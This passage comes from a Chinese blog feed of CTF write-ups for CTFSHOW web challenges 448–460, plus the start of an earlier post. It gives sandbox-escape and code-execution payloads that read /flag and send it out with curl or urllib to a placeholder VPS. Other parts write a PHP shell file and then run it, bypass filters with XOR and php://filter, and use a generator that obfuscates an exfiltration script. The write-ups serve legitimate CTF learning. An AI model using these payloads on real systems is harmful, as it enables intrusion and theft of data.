class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=import shutil;shutil.copy(&#x27;/usr/local/lib/python3.8/os.py&#x27;,&#x27;a.py&#x27;);import a;a.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web449"><a href="#web449" class="headerlink" title="web449"></a>web449</h3><p>这题把<code>sys</code>模块和<code>importlib</code>模块都禁用了，而且还删除了<code>sys</code>模块。之前的方法用不了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827110015032.png"></p><p>我们可以用<code>urllib</code>模块来发送网络请求，带出flag。urllib 是 Python 的一个标准库模块，用于<strong>处理和操作网页 URL</strong>，以及通过网络请求获取网页内容等功能。</p><p><strong>主要功能</strong></p><ul><li><strong>urllib.request</strong>：用于打开和读取 URL，发送 HTTP&#x2F;HTTPS 请求，并获取响应内容</li><li><strong>urllib.error</strong>：包含 urllib.request 相关的异常处理，如请求失败时的错误</li><li><strong>urllib.parse</strong>：用于解析 URL，包括分解和构造 URL 的各个部分</li><li><strong>urllib.robotparser</strong>：解析和处理网站的 robots.txt 文件，判断哪些网页允许爬取</li></ul><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=a=open(&#x27;/flag&#x27;).read();from urllib.request import urlopen;urlopen(&#x27;http://你的vps地址:端口?p=&#x27;%2Ba)</span><br></pre></td></tr></table></figure><p><code>%2B</code>表示加号，如果直接写加号会无法解析，需要先URL编码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827110432723.png"></p><h3 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h3><p><img src="https://oss.waynejoons.icu/picphoto/20250827110751638.png"></p><p>题目说执行<code>phpinfo</code>就可以拿到flag，看代码可知我们只要满足这个正则匹配即可执行代码，我们简单分析一下</p><ul><li><code>^</code> 和 <code>$</code> 是锚点，表示匹配字符串的开始和结束</li><li><code>[a-z]+</code> 表示匹配一个或多个小写英文字母</li><li><code>[\^]</code> 表示匹配一个脱义的插入符号 <code>^</code></li></ul><p>举个例子，也就是<code>abc^def^ghi</code>，满足正则匹配只要在中间加两个<code>^</code>即可。两个相同的字符异或，得到0，0和另一个字符异或，得到的便是另一个字符</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure><p>然后搜索flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827111327535.png"></p><h3 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h3><p><img src="https://oss.waynejoons.icu/picphoto/20250827113630839.png"></p><p>这题把<code>phpinfo</code>过滤了。前面提到，两个相同的字符异或，得到0，0和另一个字符异或，得到另一个字符，所以我们两两修改一下就好</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=aaabbbb^phpbbbb^aaainfo</span><br></pre></td></tr></table></figure><h3 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h3><p><img src="https://oss.waynejoons.icu/picphoto/20250827115632362.png"></p><p>这题过滤了挺多东西，但操作空间依然很大，直接执行代码就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=echo `ls /`;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250827120030617.png"></p><p>然后读取<code>flaag</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=echo `cat /flaag`;</span><br></pre></td></tr></table></figure><p>后面在网上看了其他方法，可以用括号包住进行字符串拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(php.info)();</span><br></pre></td></tr></table></figure><h3 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h3><p>打开网站查看源代码，可以看到提示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827125927307.png"></p><p>我们GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/show?s=XXX</span><br></pre></td></tr></table></figure><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=index.php</span><br></pre></td></tr></table></figure><p>然后查看网页源码，可以看到<code>index.php</code>代码，下面展示部分代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;command exec done&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是我们访问路径<code>/ctf/file</code>，然后POST传入内容，就会被写进<code>shell.php</code>。接着再访问路径<code>/ctf/exec</code>就可以执行<code>shell.php</code>的代码</p><p>同样的，我们用curl外带执行系统命令即可</p><p>首先GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/file</span><br></pre></td></tr></table></figure><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&lt;?php system(&#x27;curl http://你的vps地址:端口?p=`cat f*`&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问路径<code>/ctf/exec</code>，最后在服务器查看结果即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827131321033.png"></p><h3 id="web454"><a href="#web454" class="headerlink" title="web454"></a>web454</h3><p>跟上题一样，我们先查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">include</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;include done&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题把<code>system</code>换成<code>include</code>了，方法跟之前一样，只是最后的路径要改一下</p><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/file</span><br></pre></td></tr></table></figure><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&lt;?php system(&#x27;curl http://你的vps地址:端口?p=`cat f*`&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问路径<code>/ctf/include</code>，最后在服务器查看结果即可</p><h3 id="web455"><a href="#web455" class="headerlink" title="web455"></a>web455</h3><p>查看源码，这题比上题多了个<code>reload</code>函数，但是用处不大。同时<code>include</code>函数也改回<code>exec</code>函数了，可以用回web453的方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reload</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$http</span>;</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">reload</span>();</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;reload done&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/file</span><br></pre></td></tr></table></figure><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&lt;?php system(&#x27;curl http://你的vps地址:端口?p=`cat f*`&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问路径<code>/ctf/exec</code>，最后在服务器查看结果</p><h3 id="web456"><a href="#web456" class="headerlink" title="web456"></a>web456</h3><p>除去<code>reload</code>函数，这题源码相比web453没怎么变，就只是改了end信息，因此可以继续用之前的方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827133933917.png"></p><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/file</span><br></pre></td></tr></table></figure><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&lt;?php system(&#x27;curl http://你的vps地址:端口?p=`cat f*`&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问路径<code>/ctf/exec</code>，最后在服务器查看结果</p><h3 id="web457"><a href="#web457" class="headerlink" title="web457"></a>web457</h3><p>我们看看admin类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$u</span>= <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$u</span>==<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单分析一下</p><ul><li><code>check()</code> 中调用了 <code>call_user_func($this-&gt;password)</code>：<ul><li><code>call_user_func</code> 用于调用回调函数，参数可以是函数名字符串或可调用变量</li><li>这里 <code>$this-&gt;password</code> 被当成函数名调用，函数执行的结果赋给 <code>$u</code></li></ul></li><li>最后判断 <code>$u</code> 是否等于 <code>&#39;admin&#39;</code>，相等则返回 <code>true</code>，否则返回 <code>false</code></li></ul><p>因此我们传入<code>p=phpinfo</code>触发函数使其返回值为True即可，然后传入<code>u=admin</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=admin&amp;p=phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250827135630855.png"></p><h3 id="web458"><a href="#web458" class="headerlink" title="web458"></a>web458</h3><p>这题改为<code>$u===&#39;admin&#39;</code>，变成强比较了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$u</span>= <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为类名为admin，我们可以给p传入<code>get_class</code>获取类名，然后再传入<code>u=admin</code>，就满足条件了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=admin&amp;p=get_class</span><br></pre></td></tr></table></figure><h3 id="web459"><a href="#web459" class="headerlink" title="web459"></a>web459</h3><p><img src="https://oss.waynejoons.icu/picphoto/20250827141646415.png"></p><p>这题用了copy函数，PHP 中的<code>copy()</code>函数是用于<strong>复制文件</strong>的内置函数</p><p><strong>语法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool copy ( string $source , string $dest [, resource $context ] )</span><br></pre></td></tr></table></figure><ul><li><code>$source</code>：必需，要复制的源文件路径</li><li><code>$dest</code>：必需，目标文件路径（包含文件名）</li><li><code>$context</code>：可选的上下文资源</li></ul><p>我们用php伪协议即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=php://filter/read=convert.base64-encode/resource=flag.php&amp;p=1</span><br></pre></td></tr></table></figure><p>然后访问路径<code>/1.php</code>读取flag的base64编码，解码即可</p><h3 id="web460"><a href="#web460" class="headerlink" title="web460"></a>web460</h3><p>这题跟web449相比，多了一些时间检测的代码，我们看看关键部分</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827151120464.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">func_set_timeout</span>(<span class="number">0.7</span>)</span><br><span class="line">def <span class="title function_ invoke__">run</span>(s):</span><br><span class="line">    time.<span class="title function_ invoke__">sleep</span>(randmon.<span class="title function_ invoke__">random</span>())</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(s)</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250827151207910.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s=<span class="title function_ invoke__">run</span>(code)</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">except func_timeout.exceptions.FunctionTimedOut:</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>有两个区别</p><p><strong>1. 执行超时机制</strong></p><p>使用了 <code>func-timeout</code> 库，为 <code>run</code> 函数设置了 <strong>0.7 秒的超时限制</strong>。这意味着如果传入的 <code>code</code> 执行时间超过 0.7 秒，程序会抛出 <code>FunctionTimedOut</code> 异常，从而中断执行</p><p><strong>2. 随机延迟</strong></p><p>在 <code>run</code> 函数中，执行 <code>eval</code> 之前有一个 <code>time.sleep(random.random())</code>。这会增加一个 0 到 1 秒之间的随机延迟</p><p>算上随机延迟，也就是我们传入的代码必须要执行时间小于0.7s</p><p>这题有些难，参考网上Y4tacker师傅的做法，可以配合<code>urllib</code>外带数据</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getNumber3</span>(<span class="params">number</span>):</span><br><span class="line">    number = <span class="built_in">int</span>(number)</span><br><span class="line">    <span class="keyword">if</span> number <span class="keyword">in</span> [-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;~int(True)&quot;</span>, <span class="string">&quot;~int(False)&quot;</span>,</span><br><span class="line">                <span class="string">&quot;int(False)&quot;</span>, <span class="string">&quot;int(True)&quot;</span>][number + <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~%s&quot;</span> % getNumber3(~number)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(%s&lt;&lt;(int(True)))&quot;</span> % getNumber3(number / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getNumber2</span>(<span class="params">number</span>):</span><br><span class="line">    number = <span class="built_in">int</span>(number)</span><br><span class="line">    <span class="keyword">if</span> number <span class="keyword">in</span> [-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;~([]&lt;())&quot;</span>, <span class="string">&quot;~([]&lt;[])&quot;</span>,</span><br><span class="line">                <span class="string">&quot;([]&lt;[])&quot;</span>, <span class="string">&quot;([]&lt;())&quot;</span>][number + <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~%s&quot;</span> % getNumber2(~number)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(%s&lt;&lt;([]&lt;()))&quot;</span> % getNumber2(number / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;import urllib.request;import ssl;f=open(&quot;/flag&quot;).read();context = ssl._create_unverified_context();url = &quot;http://你的vps地址:端口?p=&quot;+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)&#x27;</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;str().join([&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += <span class="string">f&quot;chr(<span class="subst">&#123;getNumber3(<span class="built_in">ord</span>(i))&#125;</span>),&quot;</span></span><br><span class="line">res = res[:-<span class="number">1</span>]</span><br><span class="line">res += <span class="string">&#x27;])&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;exec(&quot;</span>+res+<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure><p>把结果拼接进Body然后POST发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=你的代码运行结果</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250827152501169.png"></p><p>简单解释一下这个代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;import urllib.request;import ssl;f=open(&quot;/flag&quot;).read();context = ssl._create_unverified_context();url = &quot;http://你的vps地址:端口?p=&quot;+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><code>import urllib.request</code>：导入用于打开和读取 URL 的模块</li><li><code>import ssl</code>：导入处理 TLS&#x2F;SSL 连接的模块</li><li><code>f = open(&quot;/flag&quot;).read()</code>：打开根目录下的 <code>flag</code> 文件，读取内容，并赋值给变量 <code>f</code></li><li><code>context = ssl._create_unverified_context()</code>：创建一个不验证 SSL 证书的上下文环境，避免因证书问题阻塞请求</li><li><code>request = urllib.request.Request(url)</code>：创建针对该 URL 的 HTTP 请求</li><li><code>response = urllib.request.urlopen(url=request, context=context)</code>：发送请求并获取响应，使用前面创建的 SSL 上下文</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>yu22x：<a href="https://blog.csdn.net/miuzzx/article/details/112692697">CTFSHOW其他篇</a></p><p>Y4tacker：<a href="https://blog.csdn.net/solitudi/article/details/113778651">[CTFSHOW]CTFSHOW-其他WP</a></p>]]></content>
    
    
    <summary type="html">CTFSHOW 其他篇第三部分详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | 其他篇题解（二）web417 - web437</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-others-2-web417-web437/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-others-2-web417-web437/</id>
    <published>2025-08-22T12:26:56.000Z</published>
    <updated>2025-11-10T04:10:54.472Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于题目比较多，所以分三个部分来写，这是第二部分</p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h3><p>有个<code>3.php</code>文件，下载后是一段加密代码，用ai解密</p><p>得到代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$c</span>==<span class="string">&#x27;show&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctf=show</span><br></pre></td></tr></table></figure><p>成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821205753136.png"></p><h3 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h3><p>先看代码</p><p><img 